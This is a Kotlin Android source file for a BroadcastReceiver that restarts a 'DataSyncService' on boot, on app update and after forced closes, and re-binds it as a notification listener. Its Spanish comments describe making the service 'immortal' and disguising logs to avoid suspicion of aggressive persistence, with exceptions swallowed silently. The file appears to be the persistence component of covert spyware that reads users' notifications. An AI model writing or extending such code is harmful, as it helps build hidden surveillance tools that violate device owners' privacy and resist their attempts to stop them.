package com.inversioneswing.starkomega

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

/* --- PROTOCOLO OMEGA: RESURRECCIÓN DE SISTEMA ---
   Este módulo asegura que el DataSyncService sea inmortal.
   Responde a:
   - Reinicio del dispositivo (BOOT_COMPLETED)
   - Instalación/Actualización (MY_PACKAGE_REPLACED)
   - Cierres forzados por el sistema (Self-Triggering)
*/

class SyncRestarter : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        
        // Log neutral para evitar sospechas de persistencia agresiva
        // Log.d("SystemEvent", "Core synchronization pulse: $action")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                android.service.notification.NotificationListenerService.requestRebind(
                    android.content.ComponentName(context, DataSyncService::class.java)
                )
            } catch (e: Exception) {}
        }

        val serviceIntent = Intent(context, DataSyncService::class.java)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // En Android 12+ no podemos iniciar servicios de fondo directamente
            // a menos que sea una respuesta a eventos específicos permitidos.
            try {
                context.startForegroundService(serviceIntent)
            } catch (e: Exception) {
                // Fallback silencioso
            }
        } else {
            context.startService(serviceIntent)
        }
    }
}
